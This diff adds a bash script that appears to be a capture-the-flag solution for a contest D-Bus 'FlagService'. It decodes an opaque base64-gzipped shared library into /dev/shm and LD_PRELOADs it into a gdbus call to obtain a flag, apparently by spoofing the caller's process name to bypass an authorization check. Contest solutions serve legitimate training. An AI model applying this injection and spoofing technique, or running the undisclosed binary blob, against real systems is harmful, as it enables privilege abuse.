@@ -1,0 +1,39 @@
+#!/bin/bash
+libpath=/dev/shm/libset_comm_to_getflag3.so
+
+cat >${libpath}.gz.txt <<EOF
+H4sICE7BLGcAA2xpYnNldF9jb21tX3RvX2dldGZsYWczLnNvAK1XX2gcRRz+7V2uuabteYaahLbo
+IkTjy+aPSY2xLXcxTU+ah7RqpVTdbO72/tDL7XV32yYF8SBUPGo1Copv7Vv7pH0TFPTUQvGt4JNv
+QRByrUhQWopCzpnd3+9udrizCs6x9833zXwzszO/md19+/DcbEhRgFIYDkGLASQIe0RtEqLsvw8e
+g22Md4n1JKwpQYyirqCvU9q3LYgQb/kiYnlfEF9Rgij6uKXc7fPy00Fcx/pr0aAv9BBfRQki2Y//
+4ma6/kN/NNx59F2P+FzG3RBEmsNjzEdT9X8kPh61jd7Prt42+r4O+pMd9KEO+kgH/Tl2PdpGP9Sh
+/mwHPe7pMUhgvFxrlihsrfkv3PwpnqrAUfDnIo48B625ObunsJ1HyakADzc5b6MHcQ+7KlxM+Npw
+eHTfDob8onXka8hDIsyubmHcrFEvFoVt2GyfUqTN/YKu55asku64hu3qOjhW+rTpglU2S3DeLrgm
+pIuWY4Kz4qSNYhHKpm1bNjhuhmUgW7YLJTcL5nLBhWJhsezmbdPIaI6ljcCRuZemX9THtDFtgpel
+ubqf5xzT1dPW0pLuWnrOdLNFI/csK/SGsznUuk9x7A8EXbzvgWd87Mb7p6QKeljQhwRdPF9GBF2c
+p0lBF/dPQtCjgp4S9O2CPly2rfSwYxazw/zWge7bm2lVKlWzRqFoZqZUfwlk6lqWmjXPq4srrulM
+qYMXMj2g7A2/sBvn7NO4v094onNAuXAclOW4sndnd3SNVToA/p5ciGOMJ2Px6djAdExNxoaSsZHV
+yPtdH4TfCYVOcqp6RfFkLHo4NtK8p9Tqr9HUpcgPbB+lLtbcUON2avVm9Htf93IAryZfS554eb76
+Y/VesrqVunzwj98aja/5So3WNq4wuFhbnk1Wb6UuT9RZyZd8Lqu3Nj4Gr83l8dTqg+5zB2aqjY2P
+mPQNn92Z6v3qnepPozXex6nkm0n9jfpFXv/ywc9ZE3e7WeYmy2xUmHh3b+rSrmE+wkvPsz6+Ynqq
++h3r2+HN8dnaWBGWCRoTvaxyY3A3+3/kiQTLcZ7nRfX1BkuDPZxzY/22x0Oc8xuq1zz+JzuG8jzk
+6jc8/jvnPNTqVz1+h3MeYvU1j//MOQ+teoVRivmjtG6IOcQY4hnExxEpBv9qNCzRR3ul3BWsR6tI
+MTqA2I94FevTnrqO2NxLGOcUX9RPc4+gcYfUPu2tdWyIzqv3EO9t+eNfwHLaoxXkO5HT83wX8nHk
+m3j/Uay/hVxF3kAunhX/lOh5LKdtOFF9iE8h7kecRTyBmEVMF41STj1n2k7BKqmjk9qoNglzhdJp
+055S5+ZmSAIts1JyVpZAy5XOalg/QHTbp3nDyQP+c4/LdNssGpxgrlx0Wc7KGK4BmpnXs7axZOr5
+jN1ioBVK7AzXsgxAc81llvdsrBVjqZBmfVmu94etmUXb0stGJlMo5UDjp5ZZYrqTZwNwjcV/Ob0P
+TTyOeQw11ysUxCgGOj0vKL4p3nh88zUnG8UFYZ/QT5vmvfItwU9xRJiAVv+8jvzOOsiu+4Kf4ppQ
+lfoXnyU8DYO/Z8hP+4BwQfJ3STgB/p4lP+07Qtp3lBSJH8S2yE/nCCGdI/L4af6PoH8aOZ0rhHSu
+cH9vG/8xLBtDnooEcaHD+AlPYr55jnV4X6Ykr19O8tciQXxdqi+v3xlofVvw1PweQaFfqi/3f17y
+0zk3jsJ2qb7sf0vy03ttAoVrUn3Zvyr5N+mcRaEi1Y9L/F300nOj+Z2DD4yKsH95kj6v4EPsn/z0
+frgZbd+fPP+fSH56btHEzT/EfwVa79teffTPo/+G9FEl75/PUBuRdPIPSbocv19A8P2V0jL6v+3g
+p/Q3joJf8MAPAAA=
+EOF
+base64 -d ${libpath}.gz.txt > ${libpath}.gz
+gunzip ${libpath}.gz
+chmod +x $libpath
+
+LD_PRELOAD=$libpath gdbus call --system \
+  --dest cn.edu.ustc.lug.hack.FlagService \
+  --object-path /cn/edu/ustc/lug/hack/FlagService \
+  --method cn.edu.ustc.lug.hack.FlagService.GetFlag3
